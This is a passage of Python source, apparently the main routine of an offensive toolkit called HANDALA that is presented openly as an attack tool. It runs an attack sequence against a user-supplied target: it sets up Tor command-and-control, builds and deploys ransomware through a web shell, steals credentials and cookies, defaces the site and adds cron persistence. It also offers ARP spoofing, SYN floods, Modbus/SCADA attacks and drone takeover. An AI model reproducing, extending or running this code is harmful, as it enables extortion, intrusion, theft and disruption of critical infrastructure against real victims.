    log("Web dashboard running at http://localhost:8080", "SUCCESS")

    # Setup Tor and C2
    setup_tor()
    C2_ONION = create_hidden_service()
    if not C2_ONION:
        log("Failed to create hidden service", "ERROR")
    else:
        start_c2_server()
        build_rust_ransomware(C2_ONION)

    # Ask for target
    target = input(f"{Fore.RED}Enter target URL/IP: {Style.RESET_ALL}").strip()
    if not target.startswith("http"):
        target = "http://" + target
    current_target = target

    # Initialize Tor client
    tor_client = TorClient()

    # Full autonomous attack
    log("Starting full autonomous attack sequence", "ATTACK")

    # 1. Reconnaissance
    domain = re.sub(r'https?://', '', target).split('/')[0].split(':')[0]
    nmap_results = real_nmap_scan(domain)
    nuclei_results = real_nuclei_scan(target)
    nikto_results = real_nikto_scan(target)

    # 2. Web exploit suite
    exploit = WebExploitSuite(target, tor_client.session)
    vulns, shell_url, admin_creds = exploit.run_full_scan()
    SHELL_URL = shell_url

    # 3. Post-exploitation
    if shell_url:
        creds = capture_and_dehash(target, tor_client.session, shell_url)
        auto_deface(target, shell_url, tor_client.session)
        deploy_ransomware(shell_url, RANSOMWARE_BINARY, tor_client.session)
        hijack_cookies_tokens(target, tor_client.session)
        # Persistence
        tor_client.session.get(shell_url, params={'c': '(crontab -l; echo "@reboot /tmp/.handala") | crontab -'}, timeout=5)
    else:
        creds = capture_and_dehash(target, tor_client.session)

    # 4. Network attacks (optional, ask user)
    if input("Launch ARP spoof? (y/n): ").lower() == 'y':
        gateway = input("Gateway IP: ")
        target_ip = domain
        NetworkAttacks.arp_spoof(target_ip, gateway)
    if input("Launch SYN flood? (y/n): ").lower() == 'y':
        NetworkAttacks.syn_flood(domain, 80, 500)

    # 5. SCADA/Drone (optional)
    modbus_ip = input("Modbus IP (optional): ").strip()
    if modbus_ip:
        ModbusExploitation.critical_attack(modbus_ip)
    drone_ip = input("Drone IP (optional): ").strip()
    if drone_ip:
        DroneExploitation.full_takeover(drone_ip)

    # 6. Generate HTML report
    generate_html_report(target, vulns, creds, admin_creds, [], [], shell_url, DEFACE_DONE, bool(RANSOMWARE_BINARY))

    # Final report
    elapsed = time.time()
    print(f"\n{Fore.RED}{'='*80}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}HANDALA v55.0 - MISSION REPORT{Style.RESET_ALL}")
    print(f"{Fore.RED}{'='*80}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}📍 TARGET: {target}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 C2 ONION: http://{C2_ONION}/st{Style.RESET_ALL}")
    print(f"{Fore.RED}🔑 KEY: {ENCRYPTION_KEY}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}🔶 XMR WALLET: {XMR_WALLET}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}🐚 SHELL: {shell_url if shell_url else 'None'}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}🎭 DEFACE: {'SUCCESS' if DEFACE_DONE else 'FAILED'}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📡 C2 active - monitor callbacks{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}[!] Web UI: http://localhost:8080{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}[!] Telegram bot token saved in {BOT_CONFIG_FILE}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[✓] MISSION COMPLETE – HANDALA VICTORY{Style.RESET_ALL}")

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        if TOR_PROC:
            TOR_PROC.terminate()
        if C2_SERVER:
            C2_SERVER.shutdown()
        if WORKSPACE and os.path.exists(WORKSPACE):
            shutil.rmtree(WORKSPACE, ignore_errors=True)
        sys.exit(0)

if __name__ == "__main__":
    main()